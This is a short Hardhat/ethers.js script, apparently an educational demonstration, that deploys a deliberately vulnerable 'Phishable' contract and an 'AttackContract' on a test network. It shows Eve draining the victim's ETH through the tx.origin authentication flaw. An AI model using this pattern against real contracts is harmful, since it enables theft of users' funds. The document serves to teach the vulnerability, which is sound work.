async function main () {
    // We get the contract to deploy
    const [owner,Eve] = await ethers.getSigners();
    const Victim = await ethers.getContractFactory('Phishable');
    const Attack = await ethers.getContractFactory('AttackContract');
    const victim = await Victim.deploy(owner.address);
    console.log('Deploying Victim...');
    const attack = await Attack.deploy(victim.address,Eve.address);
    console.log('Deploying Attacker contract...');
    let bal1 = await Eve.getBalance();
    console.log("Eve (the attacking contract's owner's balance):")
    console.log(bal1);
    console.log("The Victim contract owner deposits and ETH in his contract and one in the attackers contract")
    await victim.deposit({value: ethers.utils.parseEther("1.0")});
    console.log("deposit complete")
    const tx = {
        to: attack.address,
        value: ethers.utils.parseEther("1.0")
    };
    await owner.sendTransaction(tx);
    console.log("through tx.origin we can now steal from the contract makimg Eve's balance")
    let bal2 = await Eve.getBalance();
    console.log(bal2);
  }
  
  main()
    .then(() => process.exit(0))
    .catch(error => {
      console.error(error);
      process.exit(1);
    });
